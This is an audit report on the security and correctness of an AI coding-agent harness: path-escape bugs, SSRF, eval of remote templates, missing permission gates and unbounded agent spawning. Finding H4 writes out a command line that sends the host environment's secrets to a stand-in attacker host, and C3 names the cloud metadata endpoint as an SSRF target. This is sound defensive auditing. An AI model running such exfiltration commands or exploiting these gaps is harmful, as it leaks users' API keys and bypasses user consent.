# Openbuff Harness Audit — 2026-06-25

End-to-end audit of the Openbuff coding harness covering the agent runtime, SDK,
provider routing, CLI, and agent definitions. Findings are grouped by severity
with concrete file:line evidence and suggested fixes. Issues that I could not
verify independently (e.g. dynamic behaviour under specific model providers) are
flagged as "needs runtime validation" rather than asserted.

Subsystems audited:
- `packages/agent-runtime/` — agent loop, programmatic steps, edit transaction
- `sdk/` — tool execution, BYOK provider dispatch, file/terminal handling
- `common/` — shared schemas, config plumbing, plan-artifacts
- `cli/` — TUI, state, slash commands
- `agents/` — base2 family, editor, basher, context-pruner, reviewer
- `.agents/` — local templates, shims

Methodology: parallel `Explore` agents read code and Zod schemas; outputs
verified against the file tree; conflicts between reports flagged in the
"disagreement" notes below.

---

## TL;DR

| Bucket | Count | Representative |
|--------|-------|----------------|
| Critical | 7 | Symlink escape in file edit tools; SSRF in provider URLs; `process.env` mutation in `packages/internal/src/env.ts`; `eval()` of remote agent templates; no abort check in programmatic generator loop |
| High | 17 | Home-dir config silently shadows project config; tool validation runs after LLM call; `bash -c` accepts any string with full env inherited; `<ErrorBoundary>` component that does not catch errors |
| Medium | ~25 | Token-trim placeholder accounting; unbounded `readAuthorizationsByPath`; subagent step accounting drift; implicit `openbuff.d/` merge |
| Low | ~20 | Magic numbers, redundant debug logs, stale patterns docs |

Five themes recur across subsystems:

1. **Path containment is text-based, not filesystem-based.** `path.resolve` and
   `startsWith` are used in lieu of `fs.realpath`, allowing symlink escapes
   across every edit tool.
2. **No systematic trust boundaries.** Provider URLs, implicit config
   directories, env vars, `openbuff.d/`, and remote agent templates can all
   inject attacker-controlled data into the local process without explicit
   consent.
3. **`process.env` and host secrets bleed freely.** `run_terminal_command`
   forwards the entire host env (incl. `OPENAI_API_KEY`, `AWS_*`, etc.) to
   `bash -c`, and `packages/internal/src/env.ts` writes placeholders into the
   real env at import time.
4. **The base2 family has drifted into a triplicated-helper minefield.**
   `base2.ts`, `gate-files.ts`, `gate-paths.ts`, `gate-reviewer.ts` each carry
   inline copies of the same helpers with "keep in sync" comments; one
   existing test extracts them by regex and compiles them, which proves the
   team has already been bitten.
5. **Error visibility is inconsistent.** Some paths log everything, others
   silently swallow; the CLI ships an `ErrorBoundary` component that explicitly
   does not catch render errors; the SDK's `runOnce` can hang forever after
   abort because no listener fires `resolve`.

## CRITICAL severity

### C1. Symlink escape in file-edit tools
**Files:** `sdk/src/tools/path-utils.ts:10-30`, used by `sdk/src/tools/change-file.ts:24`,
`sdk/src/tools/replace-range.ts:99`.
**Impact:** A checked-in symlink, an extracted archive, or a sub-agent-created
symlink inside the project lets `str_replace`/`write_file`/`replace_range` write
to `/etc/passwd` or `~/.ssh/`. `path.resolve` is purely textual; `path.relative`
does not detect that the real path left the project root.
**Fix:** Use `fs.realpath` on every existing path component before comparing to
the project root. `find-files-matching-content.ts:80-84` already uses
`fs.realpathSync.native()` — apply the same pattern.

### C2. `apply_patch` uses a separate, weaker path check
**File:** `sdk/src/tools/apply-patch.ts:484-487` (`hasTraversal`) and `:491` (`path.join`).
**Impact:** The unified `path-utils.ts` helper is bypassed. `hasTraversal` only
collapses `..` lexically; symlinks still escape.
**Fix:** Route `apply_patch` through `resolveFilePathWithinProject` and add
realpath resolution.

### C3. SSRF: provider `baseURL` validator allows private/link-local IPs over HTTPS
**File:** `sdk/src/provider-config.ts:171-180` (`isLocalHttpUrl`) and the `.refine` calls
at `:206-211`, `:277-281`.
**Impact:** A hostile `openbuff.json` can POST the user's `Authorization: Bearer
<key>` to `169.254.169.254/latest/meta-data/`, RFC1918 ranges, `fc00::/7`,
`0.0.0.0`, `[::]`. The validator only restricts `http:`-scheme hostnames; over
`https:` (the default), internal IP literals pass freely.
**Fix:** Resolve the URL host, reject any non-loopback, non-public IP, and apply
the check to *both* `http:` and `https:` URLs.

### C4. `eval()` of remote agent templates (RCE)
**File:** `packages/agent-runtime/src/run-programmatic-step.ts:226-230`.
```ts
const generatorFn = typeof template.handleSteps === 'string'
  ? eval(`(${template.handleSteps})`)
  : template.handleSteps
```
**Impact:** `agentTemplate.handleSteps` source from a remote registry is
evaluated with raw `eval`, with full closure access to the local process. Any
compromise of the upstream registry yields local RCE.
**Fix:** Use `new Function('agentState', 'prompt', 'params', 'logger',
\`return (function*() { ... })()\`)` with no closure access, or run inside a
restricted `vm` context. Better: pre-compile local agent sources at build time
and only ship the compiled function strings.

### C5. No abort signal check inside programmatic generator loop
**File:** `packages/agent-runtime/src/run-programmatic-step.ts:328-430`
(the `do { ... } while (true)` inner loop).
**Impact:** `loopAgentSteps` checks `signal.aborted` at the top of each outer
iteration, but `runProgrammaticStep`'s inner `do/while` never does. A
malicious or buggy generator that yields tool calls after the user aborts will
burn up to `MAX_PROGRAMMATIC_TOOL_CALLS = 10_000` more iterations before the
runtime catches it.
**Fix:** Add `if (params.signal.aborted) throw new AbortError()` at the top of
the `do` body and let the existing outer `catch` translate it into `endTurn`.

### C6. `packages/internal/src/env.ts` mutates real `process.env`
**File:** `packages/internal/src/env.ts:13-38`.
```ts
const ensureEnvDefault = (key, value) => {
  if (!process.env[key]) {
    process.env[key] = value  // <-- permanent write to host env
  }
  envInput[key] = process.env[key]
}
```
**Impact:** Any production caller that imports `env` without first setting
every required key writes placeholders (`'test'`, `'test-secret'`,
`'test-id'`, `'postgres://...'`) into the calling process's env. These then
propagate to every spawned child (`child_process.spawn` inherits
`process.env`), into `dotenv` loaders, and into shell commands the agent runs.
The `isCI` guard is the only thing keeping this safe today.
**Fix:** Remove `process.env[key] = value`. Just populate the local `envInput`
map; `serverProcessEnv` already supports `undefined` values.

### C7. `<ErrorBoundary>` does not catch errors
**File:** `cli/src/components/error-boundary.tsx:10-55`.
The component docstring states:
```
* **WARNING: This component does NOT catch render errors.**
* // Use withErrorFallback for catching render errors:
```
…and the implementation is a passthrough that returns `children` directly.
**Impact:** Anywhere the codebase wraps a tree in `<ErrorBoundary>` for safety,
render errors propagate to the root and crash the TUI. The misleading name
makes this a trap.
**Fix:** Either delete the file and migrate all call sites to a real
error-boundary implementation (React class component with
`componentDidCatch`, or a `react-error-boundary` import), or rename it to
something honest (`Passthrough`).

## HIGH severity

### H1. Home-directory config silently shadows project keys
**File:** `sdk/src/provider-config.ts:765-794` (`getDefaultProviderConfigPaths`).
Order: `~/.config/openbuff/{provider-config.json,openbuff.json}` →
`~/.config/manicode[-dev|-test]/{provider-config.json,codebuff.json}` → every
ancestor of `cwd`. Merge is `last-wins`.
**Impact:** A stale home-dir config overrides the user's project-local
`openbuff.json` with no warning and no precedence signal in the resolved
config. Users debugging "why is my model different" can't tell which file won.
**Fix:** Print every loaded config path on startup (extend
`describeLoadedProviderConfig()`), or invert precedence so project-local wins,
with home-dir values filling only when missing.

### H2. Implicit `openbuff.d/` directory is silently merged
**File:** `sdk/src/provider-config.ts:679-686`, mirror at `:1597-1604`.
**Impact:** A repo that ships `openbuff.d/providers.json` silently merges its
providers into every developer's config when they run Openbuff inside that
tree. Combined with H1 + C3, this is a clean supply-chain vector for exfiltrating
API keys.
**Fix:** Require explicit `"extends": ["openbuff.d"]` opt-in, or at minimum emit
a `logger.warn` on implicit consumption and list implicit directories in
`describeLoadedProviderConfig()` output.

### H3. Tool validation runs *after* the LLM call
**File:** `packages/agent-runtime/src/tools/tool-executor.ts:197-231`
(`parseRawToolCall`), called from `:351` (`executeToolCall`).
The TODO at `:421` confirms the gap. Only `spawn_agents` has pre-validation
(`tool-executor.ts:432-535`); other tools (e.g. invalid `oldString` shape,
wrong `path` type) get paid for at the LLM, then a stream-chunk error is
emitted and re-prompted.
**Fix:** Add a preflight pass in `prompt-agent-stream.ts`/`processStreamWithTools`
that validates tool call shape before any handler is invoked.

### H4. `run_terminal_command` runs `bash -c` with full host env
**File:** `sdk/src/tools/run-terminal-command.ts:130-149` (background) and
`:180-202` (sync).
The handler calls `spawn('bash', ['-c', command], …, env: { ...process.env,
...(env ?? {}) })`. No allowlist, no denylist, no secret scrubbing.
**Impact:** Any prompt can `env > /tmp/leak` or `curl -H @- http://attacker/
< <(env)`, exfiltrating `OPENAI_API_KEY`, `AWS_*`, `GITHUB_TOKEN`, etc.
**Fix:** (a) Build an explicit allowlist (`PATH`, `HOME`, `LANG`, `LC_ALL`,
`TMPDIR`, `TZ`) and refuse to inherit anything else; redact keys matching
`*TOKEN*`, `*SECRET*`, `*KEY*`, `*PASSWORD*`. (b) Require user approval for any
non-read command via the SDK-level permission gate (see H5).

### H5. No SDK-level write/command permission gate
**Files:** `sdk/src/tools/run-file-change-hooks.ts`,
`sdk/src/tools/file-change-hooks.ts`.
**Impact:** The docstring at `run-file-change-hooks.ts` reads like a gate
("called before any file change"), but the implementation is a silent no-op
when no hooks are configured. The user is never prompted; destructive tool
calls execute without consent. This is a real safety gap, not just a UX issue.
**Fix:** Implement the gate: at minimum a one-shot confirm prompt for
`write_file`/`str_replace`/`edit_transaction`/`run_terminal_command` with a
project-level `.openbuff/permissions.json` allowlist that the user can edit
manually.

### H6. `list_directory` sibling-prefix bypass
**File:** `sdk/src/tools/list-directory.ts:18-20`.
```ts
if (!resolvedPath.startsWith(projectPath)) { /* reject */ }
```
String-prefix comparison without separator boundary. `projectPath =
"/home/u/project"` and `resolvedPath = "/home/u/project2/secret"` passes.
**Fix:** Compare against `projectPath + path.sep`, or use
`path.relative(projectPath, resolvedPath)` and reject when it starts with
`..` or is absolute.

### H7. `runOnce` promise can hang forever on cancelled run
**File:** `sdk/src/run.ts:236-247` (`callMainPrompt`) and `:167-188` (`onError/resolve`).
`runOnce` builds a Promise resolved only via the `resolve` callback inside
`sendAction` handlers. If `callMainPrompt` aborts mid-flight and the runtime
never sends a `prompt-response` or `prompt-error`, *and* the abort handler in
`onResponseChunk`/`onSubagentResponseChunk` silently returns without surfacing
abort up to `resolve`, the consumer awaits forever.
**Fix:** Attach an `AbortSignal` listener inside `runOnce` that calls
`resolve(getCancelledRunState('Aborted'))` once, with idempotency guard.

### H8. `run_terminal_command` timeout path leaves the promise half-resolved
**File:** `sdk/src/tools/run-terminal-command.ts:225-247`.
The timer fires `reject(...)` but does not guarantee cleanup. If SIGTERM only
kills the parent shell and orphans its children, and `clearTimeout` is not
called on `error`/`close` paths, the timer can fire on a dead process.
**Fix:** Use SIGKILL on the process group, ensure pipes are `destroy()`-ed,
and `clearTimeout` in every exit branch.

### H9. Background-job log file path leaked in tool result
**File:** `sdk/src/tools/run-terminal-command.ts:147-156`,
`sdk/src/tools/background-jobs.ts:53-58`.
The tool returns `logFile: job.logFile` (a `/tmp/...` path) in the JSON tool
result; the model sees it in plaintext and writes it to conversation history.
Combined with predictable job-id format and shared `/tmp`, this is a
mild info-leak / collusion primitive.
**Fix:** Return an opaque `jobId` and let the SDK serve log content through
`check_job` only.

### H10. No cycle/depth detection on agent spawning
**Files:** `packages/agent-runtime/src/tools/handlers/tool/spawn-agents.ts`,
`spawn-agent-inline.ts`, `spawn-agent-utils.ts:447`.
`executeSubagent` tracks `ancestorRunIds` for ID aggregation but never refuses
a child whose `agentType` matches an ancestor. A base agent can spawn another
base agent which spawns the first… up to the LLM/token budget. Permission
propagation is also unbounded (sub-budgets aren't enforced).
**Fix:** Refuse the spawn with a recoverable error if `agentType` matches any
ancestor; cap depth (e.g. `MAX_SPAWN_DEPTH = 8`); propagate a per-spawn step cap
(`min(parent.stepsRemaining, MAX_AGENT_STEPS_DEFAULT)`).

### H11. `write_file` does not validate `basedOnRead` hash against on-disk content
**File:** `packages/agent-runtime/src/tools/handlers/tool/write-file.ts:165-227`.
Only `str_replace` checks the hash. `write_file`, `replace_range`, and
post-preload `edit_transaction` accept `basedOnRead` without re-fetching and
re-comparing; if the file was modified externally between read and write, the
agent silently overwrites stale content.
**Fix:** When `basedOnRead` is provided, re-fetch via `requestOptionalFile` after
the prior edit promise resolves and compare the hash; refuse the write on
mismatch.

### H12. Triplicated helper code across base2 / gate-* files (drift bomb)
**Files:** `agents/base2/base2.ts:1087-1460`,
`agents/base2/gate-files.ts`, `gate-paths.ts`, `gate-reviewer.ts`.
Each file carries inline copies of `visitToolValue`, `collectToolInputFiles`,
`isFileChangingTool`, `hasEditArtifact`, `extractGitStatusFiles`,
`parseGitStatusLine`, `normalizeGateFilePath`, `normalizeGateFileList`,
`gateFileSetsEqual`, `stripReviewerPreamble`, `collectReviewerBlockers`,
`getReviewerFinalizationVerdict`, etc. — with "keep in sync" comments.
**Evidence of drift already happening:** `agents/__tests__/gate-reviewer.test.ts:71-87`
extracts the inline copies from `base2.ts` via regex, compiles them, and runs
them through the unit tests. The test passes *only* because the inline copies
are byte-identical; any future drift is silent.
**Fix:** Centralize the helpers in a single module and stop embedding them in
template source. If serialization constraints prevent module imports, compile a
single bootstrap function at build time that imports from a normal module,
then serialize the bootstrap.

### H13. Regex-driven `tool_choice` downgrade silently breaks agents
**File:** `sdk/src/impl/model-provider.ts:528-548`.
```ts
return /(^|[-_/])(deepseek|glm)([-_/]|$)/i.test(resolvedModel.providerModel)
```
When a model id contains `deepseek` or `glm`, `tool_choice: "required"` is
silently stripped. The agent then has no enforcement to produce a tool call
and may generate free-form text instead — manifesting as a stuck loop or a
hallucinated "done" reply.
**Fix:** Drop the regex override. Use the explicit
`compatibility.supportsRequiredToolChoice: false` flag.

### H14. Contradictory guidance in base2 system prompt
**File:** `agents/base2/base2.ts:78-83`.
The prompt mandates both "**Confirm Ambiguity/Expansion:** Do not take
significant actions beyond the clear scope of the request without confirming"
and "**Proactiveness:** Fulfill the user's request thoroughly, including
reasonable, directly implied follow-up actions." Immediately below it
"**Be careful about terminal commands**" is followed by "**Do what the user
asks:** If the user asks you to do something, even running a risky terminal
command, do it." The LLM must reconcile these on every prompt.
**Fix:** State precedence explicitly: "Proactiveness applies only to safe,
non-destructive, in-scope work; ambiguity/expansion concerns always take
precedence for destructive or expensive actions."

### H15. `isSonnet` dead branch in base2 system prompt
**File:** `agents/base2/base2.ts:19` (`const isSonnet = false`).
Hardcoded to `false`. The dead flag gates `isSonnet && "Don't create a summary
markdown file"` (`:120`) and `isSonnet ? " Don't create any summary markdown
files…" : '.'` (`:213`). Anyone flipping the flag to fix Sonnet behavior
unintentionally activates the missing-file rule in the default orchestrator.
**Fix:** Remove the dead branches entirely, or expose `isSonnet` as an option
in `createBase2`.

### H16. `agentId` unknown allows the validation/reviewer gate to be silently skipped
**File:** `agents/base2/base2.ts:417-418`.
`runValidationGate = agentId !== 'base2-fast' && agentId !== 'base2-fast-no-validation'`.
A typo (`base2-Fast` capitalized) or a custom unknown agent id runs with full
gates unintentionally. The list is whitelist-based opt-out instead of
blacklist-based opt-in, which is the more fragile choice.
**Fix:** Invert: `runValidationGate = mode !== 'fast' && !hasNoValidation`. Or
store `gates: 'on' | 'off'` on the agent definition and trust the flag.

### H17. `editor.ts` and `basher.ts` reference model names that don't exist
**Files:** `agents/editor/editor.ts:11-19`, `agents/basher.ts` model
references, `agents/base2/base2.ts` prompt mentions `anthropic/claude-opus-4.7`.
`EDITOR_MODEL_BY_VARIANT` lists `gpt-5.5`, `glm-5.1`, `kimi-k2.6`,
`deepseek-v4-pro`, `minimax-m2.7` — speculative future model IDs. If anyone
selects one today the call fails with a model-not-found error.
**Fix:** Add a startup-time validation that the model ID exists in the
providers registry, or surface the error as "this model isn't available yet"
rather than failing silently.

## MEDIUM severity

### M1. `readAuthorizationsByPath` is unbounded and persistent
**Files:** `packages/agent-runtime/src/tools/handlers/tool/write-file.ts:70-79`,
`str-replace.ts:195-203`, `run-programmatic-step.ts:497-510`.
Comment: *"Strict read-before-edit: read authorization is sticky once granted…
do NOT consume on success."* Every `read_files` on a new path adds an entry
forever, and is serialized into every persisted run-state snapshot.
**Fix:** LRU-evict entries that have no recent edit-failure flags (cap ~1000);
or scope authorization to "edits that occurred within N turns of the read."

### M2. `Object.assign(initialAgentState, newAgentState)` clobbers fields
**File:** `packages/agent-runtime/src/run-agent-step.ts:877, 1055, 1069`.
Order-sensitive and lossy: explicit `undefined` in `newAgentState` deletes the
field; missing fields silently persist. Three different call sites use the
same pattern with different intent.
**Fix:** Use structured merge with a Zod schema; whitelist the fields
propagated from subagent results.

### M3. `stepNumber` accounting inconsistent between programmatic and outer loop
**File:** `packages/agent-runtime/src/run-programmatic-step.ts:470-475`
vs `run-agent-step.ts:880, 944`.
`runProgrammaticStep` increments `stepNumber` on every tool call; `loopAgentSteps`
overwrites `totalSteps = stepNumber` then `runAgentStep` increments `totalSteps++`
again. The two counters track different things and the `addAgentStep` calls use
different values for the same step.
**Fix:** Pass `totalSteps` into `runProgrammaticStep` and use it consistently.

### M4. `edit_transaction` atomicity depends on synchronous `clientToolCall`
**Files:** `packages/agent-runtime/src/tools/handlers/tool/edit-transaction.ts:165-205`,
`packages/agent-runtime/src/process-edit-transaction.ts`.
The preflight is atomic in memory, but the actual *application* of patches goes
to the client via `requestClientToolCall`. If the client partially applies
(some files written, some failed), there is no rollback. The comment at
`:198` admits this; the workaround is to lose any files that were already written.
**Fix:** Either require the client to support a multi-file atomic patch
primitive, or snapshot prior contents of every path before the client call and
restore on partial failure.

### M5. `simplifyTerminalCommandResults` drops stdout entirely on success
**File:** `packages/agent-runtime/src/util/simplify-tool-results.ts:64-89`.
Successful command stdout is replaced with `stdoutOmittedForLength: true` and
no excerpt is kept. Agents then have no way to recover any stdout detail and
have to re-run the command.
**Fix:** Keep the first and last N bytes (e.g. head 500 + tail 500 chars) even
on success.

### M6. No general tool-result size cap
**File:** `packages/agent-runtime/src/util/simplify-tool-results.ts`,
`packages/agent-runtime/src/util/messages.ts:233-345`.
Only `run_terminal_command` and `read_files` get content-aware simplification.
Other large results (`web_search`, `spawn_agents` JSON reports) stay verbatim
and only get replaced when the *whole message* is removed.
**Fix:** Add a generic byte-size cap (e.g. truncate string contents over 30 KB
with `[truncated 30,000 of N bytes]`) and apply it in
`simplify-tool-results.ts`.

### M7. `trimMessagesToFitTokenLimit` placeholder logic is off-by-one and biased
**File:** `packages/agent-runtime/src/util/messages.ts:280-322`.
`tokensToRemove = (maxMessageTokens - requiredTokens) * (1 - shortenedMessageTokenFactor)`
with `shortenedMessageTokenFactor = 0.5` — so we aim for half headroom but the
math is unintuitive. The constant name and comment disagree ("Factor to reduce
token count target by, to leave room for new messages" vs 0.5 → 50%).
**Fix:** Rename the constant; add a comment explaining the effective target.

### M8. `trimMessagesToFitTokenLimit` throws `AssertionError` on unknown roles
**File:** `packages/agent-runtime/src/util/messages.ts:280-284`.
If a future `Message` role is added and not handled, this throws an uncaught
`AssertionError` in production on the critical path of every LLM call.
**Fix:** Skip unknown roles with `logger.warn` instead of throwing.

### M9. `MAX_PROGRAMMATIC_TOOL_CALLS = 10_000` is per-call, not per-run
**File:** `packages/agent-runtime/src/run-programmatic-step.ts:96, 328-332`.
Counter is local to one `runProgrammaticStep` invocation; a generator that
yields STEP 100 times with 99,999 tool calls each would never trigger the limit.
**Fix:** Track `programmaticIterations` on `agentState` so it accumulates
across STEP yields.

### M10. `runProgrammaticStep` catch silently overwrites existing output
**File:** `packages/agent-runtime/src/run-programmatic-step.ts:444-462`.
`agentState.output = { ...agentState.output, error: errorMessage }` keeps a
prior `output.value` alongside the error, so `getAgentOutput` may treat it as
valid output.
**Fix:** On error, set `agentState.output = undefined` (or `{ type: 'error',
message: errorMessage }`) explicitly.

### M11. Subagent step budget is not inherited from parent
**File:** `packages/agent-runtime/src/tools/handlers/tool/spawn-agent-utils.ts:361`.
Subagents get `stepsRemaining: MAX_AGENT_STEPS_DEFAULT = 200` regardless of
parent's remaining budget. A near-cap parent can hand a child a full 200 steps.
**Fix:** Inherit `min(parent.stepsRemaining, MAX_AGENT_STEPS_DEFAULT)`.

### M12. Subagent result token cost is unbounded
**File:** `packages/agent-runtime/src/tools/handlers/tool/spawn-agents.ts:89-145`.
Aggregated `output` of every spawned agent is stored verbatim in the parent's
tool result. A base agent spawning 5 max-budget subagents each producing a
20 KB report contributes ~100 KB to the parent's next LLM call.
**Fix:** Truncate each agent's `output` (and `messageHistory` summary) to a
budget (e.g. 8 KB) before serializing into `reports`.

### M13. `filterUnfinishedToolCalls` drops assistant text when tool parts are stripped
**File:** `packages/agent-runtime/src/util/messages.ts:461-490`.
When all `tool-call` content parts are filtered out, the entire assistant
message is dropped, taking any text reasoning with it. The user loses
context for what the agent was trying to do.
**Fix:** Keep the assistant message with the tool-call parts stripped, not
removed.

### M14. `previousToolCallFinished` chain can hang on silently-rejecting handler
**Files:** `packages/agent-runtime/src/tools/stream-parser.ts:200-225`,
`packages/agent-runtime/src/tools/tool-executor.ts` (`executeToolCall`).
If a custom handler never resolves or rejects (buggy code), `previousToolCallFinished`
never settles and the await at `:340` hangs forever.
**Fix:** Wrap each handler call with `Promise.race([handler(...), abort-watchdog])`,
or assert handlers must resolve within a timeout.

### M15. `handleSpawnAgentInline` returns stub result and mutates parent state
**File:** `packages/agent-runtime/src/tools/handlers/tool/spawn-agent-inline.ts:95-141`.
The handler returns `{ output: [{ type: 'json', value: { message: 'Agent spawned.' } }] }`
regardless of inline-child outcome. The parent learns nothing from the tool-result
block; if the child failed, the result still reads "Agent spawned." Also
`mapValues(parentTools, …)` is a snapshot at spawn time, so the inline child
continues with a stale `toolDefinitions` view if the parent receives new tools.
**Fix:** Return a structured result that summarises the inline agent's outcome
(status, output type, errorMessage). Reuse `result.agentState.toolDefinitions`.

### M16. `run_terminal_command` `set -o pipefail` for sync but not background
**File:** `sdk/src/tools/run-terminal-command.ts:130-202`.
The `set -o pipefail` / `tee` / `head -N` / `exit "$status"` block from the
basher prompt is documented as for SYNC only (per the prompt and the comment),
but the schema doesn't enforce it and an LLM could pass a `failure_pattern`
that's silently ignored for BACKGROUND commands.
**Fix:** Validate `save_full_log` is only set when `process_type !== 'BACKGROUND'`
in the Zod schema.

### M17. `basher.ts` `failure_pattern` is passed verbatim to `grep -E`
**File:** `agents/basher.ts:67, ~95`.
`grep -E` uses POSIX ERE; `\b` and PCRE-only escapes won't work. A caller
passing `\bfail\b` will silently get no matches.
**Fix:** Strip non-ERE escapes from `failure_pattern` or document the supported
syntax and validate on entry.

### H5-detail: `<error-boundary>` is a misnamed passthrough — see C7.

### M18. `front-end development` block injected into default orchestrator
**File:** `agents/base2/base2.ts:100-107`.
"We want to make the UI look as good as possible. Don't hold back. Give it
your all. Include as many relevant features and interactions as possible…"
embedded unconditionally in the default base2 system prompt. Backend tasks,
refactors, doc updates, and CLI work receive this directive.
**Fix:** Move into a separate `front-end-engineer` agent or behind an
`isFrontEndTask` flag derived from the prompt.

### M19. `shouldProactivelyQueryIndex` heuristic is overly permissive
**File:** `agents/base2/base2.ts:~1730`.
Trigger words include `function`, `test`, `project`, `code`, `api`. The
threshold is just `text.length >= 12`. Prompts like "write a poem about a
function" trigger a `query_index` call.
**Fix:** Require at least 2 trigger words AND a project-noun (`this codebase`,
`this project`, `in the repo`).

### M20. `extractGitStatusLineMap` ignores rename source path
**File:** `agents/base2/base2.ts:~1370-1395`.
`parseGitStatusLine` does `pathPart.split(' -> ').at(-1)` — keeps only the
rename target. If a file was renamed `a.ts → b.ts`, the fingerprint only sees
`b.ts` and won't invalidate the prior pass for `a.ts`. Same-path content
changes (via rename) pass the fingerprint check.
**Fix:** Include both source and target paths in the fingerprint entry.

### M21. `basher.ts` `command` / `toolName` mismatch is inconsistent
**File:** `agents/basher.ts:113-122`.
When `what_to_summarize` is set, `includeToolCall: false`; when unset, the
field is omitted. The intent is unclear and not tested either way.
**Fix:** Pick one policy; apply uniformly.

### M22. `editor.ts` `extractTargetFiles` regex is fragile
**File:** `agents/editor/editor.ts:~330-340`.
`collectTargetFilesFromText` uses regex to extract a `Target files:` block; if
the parent writes `**Target files:**` (markdown bold) the extraction fails.
**Fix:** Either enforce a stricter envelope or use a more forgiving parser.

### M23. Stream does not honor cancellation between chunks
**File:** `sdk/src/impl/llm.ts:752-820`.
`params.signal.aborted` is checked only at the very top of the function and
on errors. The async iteration itself relies on the underlying `fetch`
observing `signal.aborted` and throwing. Once a chunk is received but not
yet yielded, the caller cannot interrupt.
**Fix:** Add `if (params.signal.aborted) return promptAborted(...)` at the top
of each chunk loop iteration.

### M24. `apiKey` leaks through `ResolvedProviderModel`
**File:** `sdk/src/provider-config.ts:1248`.
Callers logging the result of `resolveConfiguredProviderModel(...)` will print
the API key.
**Fix:** Document `apiKey` as `@internal` in the JSDoc, or change to a lazy
getter.

### M25. `packages/internal/src/env.ts` defaults to test/placeholder values
**File:** `packages/internal/src/env.ts:13-38`.
Placeholders like `'test'`, `'test-secret'`, `'test-id'` get written to real
`process.env` (see C6 for the security impact). Even if C6 is fixed, the
defaults should not include `'postgres://user:pass@localhost:5432/db'` which
will trip real Postgres connections when accidentally imported in dev.
**Fix:** Default to undefined; require callers to supply values or throw.

## Things done well (worth preserving)

These are non-obvious good patterns I'd want preserved during any refactor:

1. **Hash-stamped `basedOnRead` anchors + sticky read-authorization.**
   `readAuthorizationsByPath` + `basedOnRead` + `getContentHash` (sha256 of
   LF-normalized content) detects external file changes between read and edit
   on large files. The hydration/persist-back pattern in both `processStream`
   and `runProgrammaticStep` finally blocks is well-commented and deliberate.

2. **Atomic `edit_transaction` preflight with in-memory staging.**
   `processEditTransaction` builds a `workingContentByPath` map and only
   commits if every edit succeeds. `failures[]` payload includes `editIndex`
   and `id` for actionable recovery messages. Bun transpiler preflight at
   `edit-transaction.ts:130-150` catches syntax errors before any file is
   touched.

3. **Centralized base-agent allowlist (`BASE_AGENT_IDS`).** Single source of
   truth for "which agents have unrestricted spawn permissions," shared
   between `validateAndGetAgentTemplate` and the executor pre-validation.
   `toolNotAgentError` makes the rejection message consistent.

4. **`sourceFiles` provenance tracking in `LoadedProviderConfig`.** Every
   provider/route/indexing setting records the file it came from; the data is
   *there*, just not surfaced in the CLI startup banner (see H1/H2).

5. **Cycle detection on `extends`/`include`/`includes`.** `state.stack` in
   `readProviderConfigFile` catches circular includes and throws an explicit
   error rather than looping forever.

6. **Atomic STATE.json writes via temp + rename.**
   `writePlanState` (`plan-artifacts.ts:215-220`) uses
   `fs.writeFileSync(tempPath)` + `fs.renameSync(tempPath, statePath)` with a
   unique temp name so a crash mid-write can never produce a half-written
   STATE.json.

7. **Anti-drift test for inline-vs-extracted helpers.**
   `agents/__tests__/gate-reviewer.test.ts:38-87` extracts inline copies from
   `base2.ts` source via regex/brace-matching, compiles them with `new Function()`,
   and exercises them. This is the only credible way to test serialized code
   paths; the technique should be extended to `gate-files.ts` and
   `gate-paths.ts`.

8. **Dual-mode reviewer parsing.** `agents/base2/base2.ts:~1550-1640`
   accepts both structured JSON (`{verdict, findings}`) and text-mode outputs
   (`BLOCKING: …`), tolerates leading `<think>…</think>` preambles via
   `stripReviewerPreamble`. Robust to model variance.

9. **Fail-closed durable gate fingerprinting.** `buildGateFingerprint`
   includes a SHA-256 of file contents (`readGateFileContentMarker`); legacy
   state without it fails closed.

10. **Per-tool abort safety in stream-parser.** `processStream` filters
    orphan tool calls when aborted mid-tool-execution
    (`stream-parser.ts:390-402`) and calls `streamWithTags.return({ aborted:
    true })` to trigger inner generator cleanup. Avoids the classic
    "unexpected tool_use_id" error.

11. **Conditional prompts via `buildArray`.** `agents/base2/base2.ts:74-78`
    uses `buildArray(condition && 'string')` to slice prompt sections by
    `isDefault`/`isFast`/`isSonnet`/`noAskUser`. Readable and consistent
    across the base2 family.

12. **Deterministic basher output pipeline.** `set -o pipefail`, explicit
    `tee` to `/tmp/openbuff-basher-*.log`, `head -${failureLineLimit}`, and
    `exit "$status"` preserve the real exit code through `tee`. Output
    schema is consistent and machine-parseable.

## Recommended remediation order

A pragmatic sequence that maximizes risk reduction per unit of effort:

| Wave | Items | Why |
|------|-------|-----|
| **P0 (security closure)** | C1, C2, C3, C6, H2, H5 | Each is independently exploitable. Together they close the silent-arbitrary-file-write surface, the API-key exfiltration surface, and the local-RCE surface. |
| **P1 (correctness)** | C5, C7, H7, H8, H11, H4 | Fixes real hangs and silent data loss. C7 (rename `<ErrorBoundary>`) is a 30-minute fix that prevents future confusion. |
| **P2 (state hygiene)** | H10, M1, M2, M3, M4, M11, M12 | Resolves the "agents behave differently across versions" class of bugs. M3 alone fixes a likely-misleading `addAgentStep` count. |
| **P3 (DX and trust)** | H1, H12, H13, H14, H15, H16, H17 | Resolves most user-facing confusion. H12 (centralize base2 helpers) is the highest-effort but unlocks safe refactors downstream. |
| **P4 (polish)** | All M* and L* items | Mechanical fixes; can be batched as a single PR. |

Estimated effort for P0 alone: ~3-5 engineer-days. Estimated effort for P0+P1+P2:
~2-3 engineer-weeks. After P0+P1, the harness is safe to extend.
